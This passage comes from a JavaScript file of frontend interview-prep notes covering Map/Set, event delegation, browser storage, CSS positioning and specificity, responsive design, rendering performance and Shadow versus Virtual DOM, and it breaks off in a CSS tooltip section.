 * ─── Map and Set ───
 * Map vs Object:
 * - Map allows ANY key type (objects, functions, numbers)
 * - Object: keys must be string or Symbol
 * - Map guarantees insertion-order iteration
 * - Object: integer-like keys are sorted first (surprising behavior)
 * - Map has O(1) .size; Object needs Object.keys(o).length
 * - Map.delete is optimized; Object property deletion deoptimizes V8 hidden classes
 * - Use Object: fixed string keys, JSON serialization, destructuring
 * - Use Map: dynamic keys, any key type, frequent add/delete
 *
 * Set: collection of unique values.
 * Deduplication: [...new Set(array)]
 * .has() is O(1) vs Array .includes() which is O(n)
 *
 * WeakMap/WeakSet: keys held weakly — GC can collect them when unreferenced elsewhere.
 * Perfect for: caching by DOM node (auto-cleaned when node is removed from DOM).
 *
 * ─── Modern JS (ES2022–2024) ───
 * arr.at(-1)                → last element (negative indexing)
 * arr.toSorted()            → returns new sorted array (original unchanged)
 * arr.toReversed()          → returns new reversed array (original unchanged)
 * arr.toSpliced(i, n, ...x) → returns new spliced array
 * Object.groupBy(arr, fn)   → groups items into object by return value of fn
 * structuredClone(obj)      → deep copy (handles Date, Map, Set, circular refs)
 * Promise.withResolvers()   → cleaner external promise resolve/reject access
 * using keyword (TC39)      → automatic cleanup for disposable resources
 */

// Code examples:

// ?? vs || difference:
const a = 0 ?? 'default';  // 0  — 0 is not null/undefined
const b = 0 || 'default';  // "default" — 0 is falsy

// Parallel requests with Promise.all:
async function loadDashboard() {
  const [user, posts, notifications] = await Promise.all([
    fetch('/api/user').then(r => r.json()),
    fetch('/api/posts').then(r => r.json()),
    fetch('/api/notifs').then(r => r.json()),
  ]); // all three fire simultaneously
}

// Immutable array operations (ES2023):
const nums = [3, 1, 4, 1, 5];
const sorted = nums.toSorted(); // new array: [1, 1, 3, 4, 5]
console.log(nums); // [3, 1, 4, 1, 5] — original untouched

// Destructuring with default and rename:
function createUser({ name, age, role: userRole = 'viewer' } = {}) {
  return { name, age, userRole };
}
createUser({ name: 'Bob', age: 25 }); // { name:'Bob', age:25, userRole:'viewer' }
createUser();                          // works! — default {} prevents crash

// Omit a key immutably (rest pattern):
const { password: _pw, ...safeUser } = { id: 1, name: 'Alice', password: 'secret' };
// safeUser = { id: 1, name: 'Alice' }

// Map with object keys (impossible with plain object):
const userA = { id: 1 }, userB = { id: 2 };
const perms = new Map();
perms.set(userA, ['read', 'write']);
perms.set(userB, ['read']);
perms.get(userA); // ['read', 'write']
// With plain object, both would key as "[object Object]" — collision

// Object key ordering gotcha:
const o = { b: 1, 2: 2, a: 3, 1: 4 };
console.log(Object.keys(o)); // ["1", "2", "b", "a"] — integers sorted first!

/**
 * 🗣️ SAY IN INTERVIEW:
 * - "const prevents reassignment, not mutation — use const by default"
 * - "Arrow functions have lexical `this` — no own `this`, no arguments object"
 * - "?? only replaces null/undefined; || replaces all falsy values including 0 and ''"
 * - "Spread creates a shallow copy — structuredClone for deep"
 * - "Object.assign MUTATES the target; spread always creates a new object"
 * - "Map allows any key type; Map.delete is optimized unlike property deletion on Object"
 * - "Promise.all fires all requests in parallel — total time = slowest request"
 * - "ES modules enable static analysis → tree shaking by bundlers"
 */


// ── 22. EVENT HANDLING ────────────────────────────────────────
/**
 * EVENT PROPAGATION — THREE PHASES:
 * When you click an element, the event doesn't just fire on that element.
 * It travels through the entire DOM tree in three phases:
 *
 * 1. CAPTURE PHASE (top → target):
 *    window → document → html → body → ... → target element
 *    Handlers registered with { capture: true } fire during this phase.
 *    Rarely used in practice.
 *
 * 2. TARGET PHASE:
 *    Event reaches the actual element that was clicked.
 *
 * 3. BUBBLE PHASE (target → top):
 *    target → ... → body → html → document → window
 *    Default. Most event handlers fire here.
 *
 * KEY METHODS:
 * - e.stopPropagation(): stops the event from continuing up the bubble chain.
 *   Doesn't stop other handlers on the same element.
 * - e.stopImmediatePropagation(): stops propagation AND stops other handlers
 *   on the same element from firing.
 * - e.preventDefault(): cancels the browser's default action.
 *   (Submit = don't submit form, click link = don't navigate)
 *   Does NOT stop propagation — they are independent.
 *
 * e.target: the element that ORIGINALLY triggered the event (deepest element clicked)
 * e.currentTarget: the element that this handler is attached TO
 * (these differ when using event delegation)
 *
 * EVENT DELEGATION:
 * Instead of adding one click handler per list item (1000 items = 1000 handlers),
 * add ONE handler on the parent. Every click on a child bubbles up to the parent.
 * Use e.target to determine which child was clicked.
 *
 * Benefits:
 * - Performance: 1 listener instead of N
 * - Automatically works for dynamically added elements (they bubble too)
 * - Less memory (fewer closures)
 *
 * Gotcha with nested elements: user clicks <span> inside <li>.
 * e.target = <span>, not <li>. Fix: e.target.closest('li') walks up
 * from the clicked element to find the nearest matching ancestor.
 *
 * LISTENER OPTIONS:
 * { passive: true }  — promise that preventDefault won't be called.
 *                      Browser can scroll on the GPU thread immediately instead of waiting.
 *                      Use on scroll, touchstart, touchmove for smooth scrolling.
 * { once: true }     — listener auto-removes itself after firing once.
 * { capture: true }  — fire during capture phase instead of bubble.
 * { signal: ctrl.signal } — AbortController integration — remove all listeners with one abort().
 *
 * REACT EVENT SYSTEM:
 * React uses a single event listener at the root element (event delegation internally).
 * React wraps native events in SyntheticEvent for cross-browser consistency.
 * Props are camelCase: onClick, onChange, onKeyDown (not onclick, onkeydown).
 * onClickCapture = capture phase. onClick = bubble phase.
 * Note: calling e.stopPropagation() stops React's synthetic event, not the native event.
 */

// Event delegation pattern:
document.querySelector('ul').addEventListener('click', (e) => {
  const li = e.target.closest('li'); // finds the <li> even if inner <span> was clicked
  if (!li) return; // click was outside any <li>
  const id = li.dataset.id;
  handleItemClick(id);
});
function handleItemClick(id) { /* ... */ }

// Modern cleanup with AbortController — removes ALL listeners in one call:
function setupListeners() {
  const ctrl = new AbortController();
  const { signal } = ctrl;
  window.addEventListener('scroll',  onScroll,  { passive: true, signal });
  window.addEventListener('resize',  onResize,  { signal });
  document.addEventListener('click', onClick,   { signal });
  return () => ctrl.abort(); // unregisters all three at once
}
function onScroll() {}
function onResize() {}
function onClick() {}

/**
 * 🗣️ SAY IN INTERVIEW:
 * - "Events go through three phases: capture (down), target, bubble (up)"
 * - "Handlers fire on bubble by default — use { capture: true } for capture phase"
 * - "Event delegation: one parent handler, use e.target.closest() to find the child"
 * - "e.target = element clicked; e.currentTarget = element handler is attached to"
 * - "preventDefault and stopPropagation are independent — one doesn't imply the other"
 * - "passive: true lets the browser scroll immediately without waiting for JS"
 * - "AbortController can remove multiple listeners with a single abort() call"
 */


// ── 23. BROWSER STORAGE & KEY APIs ───────────────────────────
/**
 * ─── STORAGE OPTIONS ───
 *
 * localStorage:
 * - Persists FOREVER until explicitly cleared or browser storage is cleared
 * - ~5MB limit, synchronous (blocks main thread on large reads/writes)
 * - String values ONLY — must JSON.stringify() to store objects
 * - Shared across all tabs of the same origin
 * - Never store sensitive data (tokens, passwords) — accessible by any JS on the page
 *
 * sessionStorage:
 * - Same API as localStorage but dies when the TAB is closed
 * - Not shared between tabs (each tab has its own)
 * - Good for: temporary session data, multi-step form progress
 *
 * Cookies:
 * - Small (~4KB), configurable expiry, automatically SENT with every HTTP request
 * - HttpOnly: not accessible via JS (protects from XSS cookie theft)
 * - Secure: only sent over HTTPS
 * - SameSite: controls when cookie is sent on cross-site requests (CSRF protection)
 * - Use for: session tokens (set HttpOnly + Secure + SameSite)
 *
 * IndexedDB:
 * - Large storage (gigabytes possible), asynchronous, full database with indexes
 * - Stores structured data (objects, files, blobs) — not just strings
 * - Good for: offline-capable apps, large client-side datasets, caching large files
 * - Use a wrapper library (idb) because the raw API is verbose
 *
 * | API            | Size  | Lifetime          | Sent with request? | Async? |
 * |----------------|-------|-------------------|--------------------|--------|
 * | localStorage   | ~5MB  | Forever           | ❌                 | ❌     |
 * | sessionStorage | ~5MB  | Tab session       | ❌                 | ❌     |
 * | Cookies        | ~4KB  | Configurable      | ✅ Every request   | ❌     |
 * | IndexedDB      | Large | Forever           | ❌                 | ✅     |
 *
 * ─── KEY BROWSER APIS ───
 *
 * IntersectionObserver:
 * Fires a callback when an element enters or leaves the viewport (or a container).
 * Far more performant than a scroll event listener (runs off main thread).
 * Use for: lazy-loading images, infinite scroll, analytics (was element seen?),
 *          triggering animations on scroll.
 *
 * MutationObserver:
 * Watches the DOM for changes: node additions/removals, attribute changes, text changes.
 * Use for: reacting to third-party DOM changes, building custom reactive systems.
 *
 * ResizeObserver:
 * Fires when an ELEMENT (not just the window) changes size.
 * Use for: responsive components based on their container size (complement to container queries).
 *
 * requestAnimationFrame (rAF):
 * Schedules a callback to run before the browser's next repaint.
 * Synced to the display refresh rate (~60fps or 120fps).
 * Use for: smooth animations, batching DOM writes before paint.
 * Better than setTimeout for animations — automatically paused when tab is hidden.
 *
 * Web Workers:
 * Run JavaScript on a SEPARATE thread. Cannot access the DOM.
 * Communicate with the main thread via postMessage().
 * Use for: heavy computation (image processing, data parsing, crypto).
 * Service Workers are a special type that intercepts network requests.
 *
 * Service Workers:
 * Act as a programmable proxy between your app and the network.
 * Can intercept fetch requests, serve from cache, enable offline.
 * Also powers: Push Notifications, Background Sync.
 * Use for: offline-first apps, PWAs, caching strategies.
 *
 * History API:
 * pushState / replaceState: change URL without full page reload.
 * popstate event: fires on back/forward navigation.
 * Foundation of all SPA routing (React Router, Vue Router).
 *
 * BroadcastChannel:
 * Communicate between browser tabs/windows of the same origin.
 * Use for: sync logout across tabs, theme changes, shared session state.
 *
 * fetch():
 * Does NOT reject on HTTP errors (404, 500). It only rejects on network failure.
 * ALWAYS check res.ok (or res.status) manually. This is a very common bug.
 */

// IntersectionObserver for lazy-loading images:
const imgObserver = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      const img = entry.target;
      img.src = img.dataset.src;    // swap placeholder for real src
      imgObserver.unobserve(img);   // stop watching this image
    }
  });
}, { rootMargin: '200px' }); // start loading 200px before entering viewport
document.querySelectorAll('img[data-src]').forEach(img => imgObserver.observe(img));

// fetch with proper error handling:
async function safeFetch(url, options = {}) {
  const res = await fetch(url, {
    ...options,
    signal: AbortSignal.timeout(5000), // abort if no response in 5 seconds
  });
  if (!res.ok) {
    throw new Error(`Request failed: ${res.status} ${res.statusText}`);
  }
  return res.json();
}

/**
 * 🗣️ SAY IN INTERVIEW:
 * - "fetch does NOT reject on 404 or 500 — you MUST check res.ok manually"
 * - "IntersectionObserver is more performant than scroll listeners for lazy loading"
 * - "Service Workers enable offline-first apps by intercepting network requests"
 * - "Web Workers run CPU-heavy code off the main thread — no DOM access"
 * - "localStorage is synchronous and string-only — never store sensitive data there"
 * - "BroadcastChannel lets tabs communicate — useful for syncing logout"
 */


// ── 24. CSS POSITIONING ───────────────────────────────────────
/**
 * CSS position determines how an element is placed in the document
 * and how it interacts with surrounding elements.
 *
 * POSITION VALUES:
 *
 * static (default):
 * - Element flows naturally in the document.
 * - top/left/z-index have NO effect on static elements.
 * - "Not positioned" — other position values create "positioned" elements.
 *
 * relative:
 * - Element stays in the document flow (holds its space).
 * - top/left/right/bottom offset it VISUALLY from its original position.
 * - Its original space is still occupied (unlike absolute).
 * - Most importantly: creates a POSITIONED ANCESTOR for children to anchor to.
 *
 * absolute:
 * - Removed from document flow completely (no space reserved).
 * - Positioned relative to the NEAREST POSITIONED ANCESTOR
 *   (nearest element with position ≠ static).
 * - If no positioned ancestor exists, positions relative to initial containing block (html).
 * - Classic pattern: parent { position: relative } + child { position: absolute }
 *
 * fixed:
 * - Removed from flow. Positioned relative to the VIEWPORT.
 * - Stays in place when you scroll — perfect for sticky headers, floating buttons.
 * - ⚠️ GOTCHA: If any ancestor has transform, filter, or will-change: transform,
 *   a new containing block is created. position: fixed behaves like absolute — it NO LONGER
 *   positions to the viewport! This is a common bug with animated parent containers.
 *
 * sticky:
 * - Hybrid: acts like relative UNTIL a scroll threshold, then "sticks" like fixed.
 * - Stays stuck only within its parent container's bounds.
 * - REQUIREMENTS: must specify at least one of top/bottom/left/right.
 * - COMMON BUGS:
 *   1. Any ancestor with overflow: hidden / auto / scroll BREAKS sticky.
 *      The element can't escape the overflow container.
 *   2. Parent must be tall enough for there to be scroll distance.
 *
 * Z-INDEX AND STACKING CONTEXTS:
 * z-index controls which elements appear on top.
 * But z-index only works on POSITIONED elements (or flex/grid items).
 * z-index: 9999 on a non-positioned element = ignored.
 *
 * STACKING CONTEXT — the most confusing CSS concept:
 * Some CSS properties create an "isolated stacking context" — a new layer
 * where z-index values are LOCAL (children can't escape it).
 * Created by: position + z-index (not auto), opacity < 1, transform ≠ none,
 *             filter, will-change, isolation: isolate.
 *
 * THE TRAP: A dropdown inside a modal might have z-index: 9999.
 * But if the modal's parent has z-index: 1 and another element has z-index: 2,
 * the dropdown is TRAPPED inside z:1 and can never appear above z:2.
 * Fix: portal the dropdown to <body> (React Portal), or fix the stacking order.
 *
 * Best practice: define a z-index scale with CSS custom properties:
 * --z-dropdown: 100; --z-sticky: 200; --z-modal-backdrop: 300;
 * --z-modal: 400; --z-tooltip: 500; --z-toast: 600;
 *
 * COMMON LAYOUT PATTERNS:
 * Badge on avatar: parent { position: relative } + badge { position: absolute; top: -4px; right: -4px }
 * Full overlay: position: fixed; inset: 0; (shorthand for top/right/bottom/left: 0)
 * Center with transform: position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%)
 *
 * 🗣️ SAY IN INTERVIEW:
 * - "absolute is positioned to nearest ancestor with position ≠ static"
 * - "fixed breaks when an ancestor has transform — creates a new containing block"
 * - "sticky fails if any ancestor has overflow: hidden/auto/scroll"
 * - "z-index only works on positioned elements or flex/grid items"
 * - "Stacking contexts are isolated — a z:9999 child can't beat a z:2 parent"
 */

// Why z-index "suddenly stops working" (classic interview trap):
// .card        { position: relative; z-index: 1;    }
// .card .menu  { position: absolute; z-index: 9999; } /* inside .card */
// .overlay     { position: fixed;    z-index: 2;    }
//
// Result: overlay (z:2) COVERS the menu (z:9999)!
// Why: .menu is inside .card's stacking context (z:1).
// The browser compares .card(1) vs .overlay(2) → overlay wins.
// .menu's z:9999 only matters WITHIN .card's context, not against the outside world.


// ── 25. RESPONSIVE DESIGN ─────────────────────────────────────
/**
 * WHAT IS RESPONSIVE DESIGN?
 * One codebase, one set of HTML/CSS, works well on all screen sizes.
 * THREE PILLARS: fluid grids, flexible media, media queries.
 *
 * MOBILE-FIRST APPROACH (recommended):
 * Write base styles for the smallest screen.
 * Then add min-width breakpoints to add complexity for larger screens.
 * Why? Mobile constraints force content-first thinking.
 * Also: smaller CSS payload delivered to mobile devices.
 *
 * @media (min-width: 768px) { /* tablet+ styles */ }
 * @media (min-width: 1200px) { /* desktop styles */ }
 *
 * CSS UNITS FOR RESPONSIVE DESIGN:
 * rem: relative to root font-size (16px default). Perfect for font sizes.
 *      User can increase browser font size and your layout scales with it.
 * %: percentage of parent. Good for widths.
 * vw/vh: percentage of viewport width/height. Useful for full-screen sections.
 * dvh: dynamic viewport height — accounts for mobile browser chrome (URL bar).
 *      Use dvh instead of vh for mobile — vh doesn't account for the browser bar.
 * fr: fraction of available grid space.
 * ch: width of the "0" character. max-width: 65ch = optimal reading line length.
 * px: still useful for borders, shadows, small fixed values.
 *
 * CLAMP() — the responsive power function:
 * Syntax: clamp(minimum, preferred, maximum)
 * font-size: clamp(1rem, 2.5vw, 2rem)
 * → At small screens: 1rem minimum. At large: 2rem maximum. Scales fluidly in between.
 * → Replaces multiple min-width breakpoints for typography and spacing.
 * width: clamp(320px, 90%, 1200px)  → fluid width with min and max
 *
 * CONTAINER QUERIES (CSS 2023+):
 * The problem with media queries: they respond to the VIEWPORT width.
 * A sidebar component in a narrow column looks different from the same
 * component used full-width. Media queries can't handle this.
 * Container queries respond to the SIZE OF THE PARENT CONTAINER.
 *
 * .wrapper { container-type: inline-size; container-name: card; }
 * @container card (min-width: 400px) {
 *   .card { flex-direction: row; }
 * }
 * → Card is horizontal when its CONTAINER is wide, not when the viewport is wide.
 * → Enables truly reusable components that adapt to any context.
 *
 * RESPONSIVE IMAGES:
 * Always set width and height attributes on <img> to prevent CLS (layout shift).
 * loading="lazy" for images below the fold.
 * fetchpriority="high" for the LCP image (never lazy-load the LCP image!).
 * srcset + sizes: browser picks the right resolution for the device.
 * <picture>: art direction (different crop per breakpoint) or format switching.
 *
 * MODERN MEDIA QUERY FEATURES:
 * @media (hover: hover) → device supports hover (distinguishes touch vs mouse)
 * @media (prefers-color-scheme: dark) → respect OS dark mode setting
 * @media (prefers-reduced-motion: reduce) → disable animations for vestibular disorders
 * @media (width >= 768px) → range syntax (cleaner than min-width, supported now)
 *
 * 🗣️ SAY IN INTERVIEW:
 * - "Mobile-first: base styles for mobile, add complexity with min-width queries"
 * - "clamp() creates fluid values between a min and max with no media queries"
 * - "Container queries make components respond to their container — not the viewport"
 * - "dvh replaces vh — accounts for mobile browser chrome"
 * - "prefers-reduced-motion: reduce is an accessibility requirement, not optional"
 * - "Add breakpoints where your design breaks, not at arbitrary device widths"
 */

// Responsive grid without any media queries:
// .grid {
//   display: grid;
//   grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
//   gap: clamp(1rem, 2vw, 2rem);
// }

// Fluid typography:
// h1 { font-size: clamp(1.5rem, 5vw, 3rem); }
// p  { max-width: 65ch; }  /* optimal reading width */


// ── 26. CSS SPECIFICITY & CASCADE ────────────────────────────
/**
 * THE SPECIFICITY SCORING SYSTEM:
 * When multiple CSS rules target the same element, specificity determines the winner.
 * Specificity is calculated as a tuple: (ID count, Class/attr/pseudo-class count, Element count)
 *
 * SCORING:
 * Universal selector (*), combinators (+, >, ~, space): (0,0,0) — zero specificity
 * Element selectors (div, p, h1, ::before): (0,0,1) per element
 * Class (.nav), attribute ([type="text"]), pseudo-class (:hover): (0,1,0) per one
 * ID (#header): (1,0,0) per ID
 * Inline style (style=""): always beats any selector
 * !important: beats everything (nuclear option — avoid it)
 *
 * CRITICAL RULE: (1,0,0) always beats (0,∞,∞).
 * ONE ID beats ANY number of classes and elements combined.
 * This is why IDs for styling are problematic — too hard to override.
 *
 * TIE-BREAKER: If two selectors have identical specificity,
 * the one that appears LATER in the CSS wins (source order).
 *
 * EXAMPLES:
 * #app p         → (1,0,1) — wins against everything below
 * .text.highlight → (0,2,0) — two classes
 * div p.text     → (0,1,2) — one class + two elements
 * p              → (0,0,1) — just one element
 *
 * MODERN SELECTORS AND SPECIFICITY:
 * :is(h1, h2, h3) → takes the specificity of its MOST SPECIFIC argument
 * :where(h1, h2)  → ALWAYS zero specificity (0,0,0) — perfect for overridable base styles
 * :not(p)         → takes specificity of its argument
 * :has(.child)    → takes specificity of its argument
 *
 * THE CASCADE — full resolution order:
 * 1. Origin (browser default < author styles < user styles < !important)
 * 2. @layer position (later layers win, unlayered beats all layers)
 * 3. Specificity (higher wins)
 * 4. Source order (later wins on tie)
 *
 * CASCADE LAYERS (@layer) — new in 2022:
 * @layer reset, base, components, utilities;
 * Later layers beat earlier ones REGARDLESS of specificity.
 * Unlayered styles beat ALL layers.
 * Lets you build proper specificity architecture without !important wars.
 *
 * BEST PRACTICES:
 * - BEM methodology (.block__element--modifier): all selectors at (0,1,0)
 *   No IDs for styling. No deep nesting. Specificity stays flat.
 * - Use :where() for base/reset styles — easy for users to override
 * - Use @layer to separate reset/base/components/utilities with clear priority
 * - Never use !important except for utility classes (and document why)
 *
 * 🗣️ SAY IN INTERVIEW:
 * - "Specificity is (ID, Class, Element) — one ID always beats any number of classes"
 * - "Equal specificity = last rule in source order wins"
 * - ":where() has zero specificity — great for base styles you want easily overridable"
 * - "Cascade Layers add priority control above specificity — no more !important wars"
 * - "BEM keeps all selectors at (0,1,0) — flat and predictable"
 */


// ── 27. HTML BEST PRACTICES & PERFORMANCE ────────────────────
/**
 * DOCUMENT SETUP:
 * <!DOCTYPE html>  — must be first. Triggers standards mode. Without it: quirks mode.
 * <html lang="en"> — language attribute is critical for screen readers + SEO.
 * <meta charset="UTF-8"> — MUST be within first 1024 bytes of HTML (before any text).
 * <meta name="viewport" content="width=device-width, initial-scale=1"> — enables responsive layout.
 *
 * SCRIPT LOADING:
 * HTML parsing stops when a <script> is encountered (without async/defer).
 * The browser must download + execute the script before continuing to parse HTML.
 *
 * | Attribute | Download      | Execute            | Preserves order? |
 * |-----------|---------------|--------------------|------------------|
 * | (none)    | Blocks parse  | Immediately        | Yes              |
 * | defer     | Parallel      | After DOM parsed   | Yes              |
 * | async     | Parallel      | ASAP (can interrupt)| No              |
 * | type=module| Parallel     | After DOM parsed   | Yes              |
 *
 * Use defer for: scripts that need the DOM (most scripts)
 * Use async for: independent scripts that don't need each other or the DOM (analytics)
 *
 * RESOURCE HINTS:
 * <link rel="preload" as="font" href="..."> 
 *   → WILL be needed soon. Browser fetches with high priority immediately.
 *   Use for: LCP image, critical fonts, important scripts.
 *
 * <link rel="prefetch" href="...">
 *   → MIGHT be needed later (next page user will likely navigate to).
 *   Browser fetches at idle time, caches for future use.
 *
 * <link rel="preconnect" href="https://api.example.com">
 *   → Establish early DNS + TCP + TLS to a third-party origin.
 *   Use for: API domains, CDN, Google Fonts.
 *   Saves ~100–200ms per cross-origin resource.
 *
 * IMAGE OPTIMIZATION:
 * Always include width and height: prevents CLS (layout shift).
 * Without these, the browser doesn't know the image's space until it loads.
 * The content below it jumps down when the image loads — terrible UX and bad CLS score.
 *
 * loading="lazy" on below-fold images — browser delays loading until near viewport.
 * loading="eager" or no attribute on above-fold images (especially LCP).
 * fetchpriority="high" on LCP image — tells browser to prioritize this fetch.
 *
 * srcset + sizes: lets browser choose the right resolution:
 * <img src="img-800.jpg"
 *      srcset="img-400.jpg 400w, img-800.jpg 800w, img-1600.jpg 1600w"
 *      sizes="(max-width: 600px) 100vw, 50vw"
 *      width="800" height="600" alt="description">
 *
 * <picture> for art direction (different crop) or format choice:
 * <picture>
 *   <source srcset="img.avif" type="image/avif">
 *   <source srcset="img.webp" type="image/webp">
 *   <img src="img.jpg" alt="...">  <!-- fallback -->
 * </picture>
 *
 * SECURITY IN HTML:
 * rel="noopener noreferrer" on any target="_blank" link:
 *   noopener: prevents the new tab from accessing window.opener (security)
 *   noreferrer: doesn't send the Referer header (privacy)
 * sandbox on <iframe>: restricts what the iframe can do (no scripts, no forms, etc.)
 * CSP header: most important XSS defense — whitelist allowed script sources.
 *
 * 🗣️ SAY IN INTERVIEW:
 * - "defer for DOM-dependent scripts, async for independent ones"
 * - "preload for critical resources, preconnect for third-party origins"
 * - "Always set width and height on images to prevent CLS"
 * - "fetchpriority=high on the LCP image — never lazy-load the LCP element"
 * - "noopener noreferrer on target=_blank links — security and privacy"
 */



// ── 28. left: 200px vs transform: translateX(200px) ──────────
/**
 * QUESTION: Both move an element 200px to the right. Which is faster and why?
 * Answer: transform: translateX(200px) is significantly faster.
 * To understand why, you need to understand how the browser renders a frame.
 *
 * THE BROWSER RENDERING PIPELINE (what happens each frame):
 * JavaScript → Style → Layout → Paint → Composite
 *
 * Each stage has a cost. The later in the pipeline you can skip, the faster it is.
 *
 * ─── left: 200px ───
 * `left` is a layout property. It affects where the element sits in the document flow.
 * Changing it triggers the FULL pipeline:
 *
 * 1. Style: browser recalculates computed styles (which elements are affected).
 * 2. Layout (Reflow): browser recalculates the geometry — position and size — of
 *    the changed element AND potentially every element around it.
 *    If you move a div, everything that wraps around it might shift too.
 *    Layout is the most expensive stage. It runs on the MAIN THREAD.
 * 3. Paint: browser repaints the pixels in the affected regions.
 * 4. Composite: GPU assembles layers and puts them on screen.
 *
 * Cost: triggers Layout + Paint + Composite on every frame.
 * Runs on the main thread → competes with JavaScript, blocks interaction.
 *
 * ─── transform: translateX(200px) ───
 * `transform` does NOT affect layout. The element's position in the document
 * flow stays exactly the same. No other element is affected.
 * The browser knows this statically — it can SKIP Layout and Paint entirely.
 *
 * 1. Style: recalculate (minimal).
 * 2. ~~Layout~~: SKIPPED — transform doesn't change layout geometry.
 * 3. ~~Paint~~: SKIPPED — the pixels don't change, just which layer they're on.
 * 4. Composite: the GPU moves the element's composited layer.
 *    This runs on the GPU thread, completely independent of the main thread.
 *
 * Cost: Composite only. Runs on the GPU thread.
 * The main thread is free to handle JavaScript and user interactions.
 *
 * THE RESULT:
 * transform animations can hit 60fps (or 120fps) consistently because:
 * - No layout recalculation (the most expensive step is skipped)
 * - No repaint (pixels don't change, just their position on screen)
 * - GPU handles it — dedicated hardware, no JS thread competition
 *
 * left: 200px may cause dropped frames because:
 * - Layout runs every frame — expensive for complex pages
 * - Other JS work can interrupt it
 * - The browser may coalesce changes, but it's still costly
 *
 * OTHER PROPERTIES THAT ARE CHEAP (skip Layout and/or Paint):
 * - opacity: changes transparency — skips layout, skips paint, GPU only
 * - transform: translate, rotate, scale, skew — all GPU composited
 * These two are the ONLY properties you should animate for smooth 60fps.
 *
 * PROPERTIES THAT ARE EXPENSIVE:
 * - width, height, margin, padding → trigger Layout (reflow)
 * - background-color, color, border → trigger Paint
 * - box-shadow → triggers Paint (expensive paint)
 *
 * WILL-CHANGE HINT:
 * will-change: transform tells the browser "this element is about to be animated".
 * The browser promotes it to its own compositor layer in advance.
 * Reduces frame-1 jank. But don't overuse — each layer consumes GPU memory.
 *
 * VISUAL DIFFERENCE:
 * left: 200px (with position: relative/absolute) → moves in document flow context.
 * transform: translateX(200px) → moves visually but the element's layout box
 * stays at the original position. Other elements do NOT shift around it.
 *
 * 🗣️ SAY IN INTERVIEW:
 * - "left triggers Layout → Paint → Composite — three pipeline stages on the main thread"
 * - "transform skips Layout and Paint — only Composite runs, on the GPU thread"
 * - "The GPU thread is independent of the main thread — animations don't block JS"
 * - "Only animate transform and opacity for smooth 60fps — everything else is expensive"
 * - "will-change: transform promotes the element to its own layer before the animation starts"
 * - "transform doesn't affect surrounding elements' layout — left does"
 */


// ── 29. SHADOW DOM vs VIRTUAL DOM ────────────────────────────
/**
 * These sound similar but are completely different things solving different problems.
 *
 * ─── VIRTUAL DOM ───
 *
 * WHAT IT IS:
 * A programming pattern/concept used by React (and others like Vue 2).
 * It's a lightweight in-memory JavaScript representation of the real DOM.
 * It's NOT a browser feature — it's a library-level abstraction.
 *
 * WHY IT EXISTS:
 * Direct DOM manipulation is slow when done naively — especially when you
 * re-render a large UI on every state change. The Virtual DOM is React's
 * strategy for minimizing expensive real DOM operations.
 *
 * HOW IT WORKS:
 * 1. Your component returns JSX → React creates a Virtual DOM tree (plain JS objects).
 * 2. State changes → React creates a NEW Virtual DOM tree.
 * 3. React DIFFS the old tree vs new tree (reconciliation).
 * 4. React calculates the minimal set of real DOM changes needed.
 * 5. React applies ONLY those changes to the actual DOM (commit phase).
 *
 * The key insight: diffing two JS objects in memory is much faster than
 * making many real DOM mutations. Real DOM operations trigger style
 * recalculation, layout, paint — JS object comparisons don't.
 *
 * IS THE VIRTUAL DOM ALWAYS FASTER?
 * No — this is a common misconception. Frameworks like Svelte compile
 * components to direct DOM updates at build time (no runtime VDOM).
 * Solid.js uses fine-grained reactivity — updates only the exact DOM node
 * that changed, no diffing needed.
 * React's VDOM has overhead. Its advantage is developer ergonomics (write
 * declarative code, let React figure out the DOM updates) and good-enough
 * performance for most apps.
 *
 * ─── SHADOW DOM ───
 *
 * WHAT IT IS:
 * A BROWSER NATIVE feature (part of the Web Components spec).
 * It lets you attach a hidden, encapsulated DOM subtree to an element.
 * That subtree has its own scope — CSS and JS from outside can't reach in,
 * and CSS from inside can't leak out.
 *
 * WHY IT EXISTS:
 * Encapsulation. You want to build a truly isolated component where:
 * - Your CSS won't accidentally style it
 * - Its internal CSS won't pollute your page
 * - Its internal DOM structure is hidden/private
 *
 * You already use Shadow DOM every day without knowing it:
 * <video>, <input type="range">, <input type="date">, <details> —
 * these all use Shadow DOM internally. That's why you can't easily style
 * the play button inside <video> with regular CSS.
 *
 * HOW IT WORKS:
 * const shadow = element.attachShadow({ mode: 'open' });
 * shadow.innerHTML = `
 *   <style> p { color: red; } </style>
 *   <p>This is encapsulated</p>
 * `;
 * // The <p> inside shadow is invisible to document.querySelector('p')
 * // The style `p { color: red }` ONLY applies inside this shadow root
 *
 * mode: 'open' → shadow root accessible via element.shadowRoot from outside JS
 * mode: 'closed' → completely private, element.shadowRoot returns null
 *
 * SLOTS: Shadow DOM uses <slot> to accept content from the "light DOM" (host page):
 * <my-card>
 *   <span slot="title">Hello</span>  ← light DOM content
 * </my-card>
 * Inside the shadow: <slot name="title"></slot> ← projects the content here
 *
 * ─── COMPARISON ───
 * | Aspect         | Virtual DOM                    | Shadow DOM                    |
 * |----------------|--------------------------------|-------------------------------|
 * | What it is     | JS library concept (React etc) | Native browser API            |
 * | Purpose        | Efficient DOM update diffing   | Style/DOM encapsulation       |
 * | Where it lives | JavaScript (in memory)         | Browser (actual DOM feature)  |
 * | CSS isolation  | ❌ No                          | ✅ Yes — styles are scoped    |
 * | DOM isolation  | ❌ No                          | ✅ Yes — hidden subtree       |
 * | Used by        | React, Vue 2                   | Web Components, browser UIs   |
 * | Framework?     | Yes (React, Vue)               | No — native browser standard  |
 *
 * Can they be used together? Yes.
 * React can render INTO a Shadow DOM. Web Components with Shadow DOM
 * can coexist with React apps. They operate at different layers.
 *
 * 🗣️ SAY IN INTERVIEW:
 * - "Virtual DOM is a React abstraction — an in-memory JS copy used to diff changes"
 * - "Shadow DOM is a browser native feature for encapsulation — CSS can't leak in or out"
 * - "Virtual DOM is about update efficiency; Shadow DOM is about style/DOM isolation"
 * - "You use Shadow DOM already — <video> and <input type=range> use it internally"
 * - "Virtual DOM isn't always faster — Svelte compiles away the VDOM entirely"
 */



// ── 30. CSS-ONLY TOOLTIP ──────────────────────────────────────
/**
 * CONSTRAINT: No JavaScript. Pure HTML + CSS only.
 *
 * APPROACH:
 * Use the CSS :hover pseudo-class on a wrapper element.
 * The tooltip is always in the DOM but hidden (opacity: 0 or visibility: hidden).
 * On hover, it becomes visible.
 *
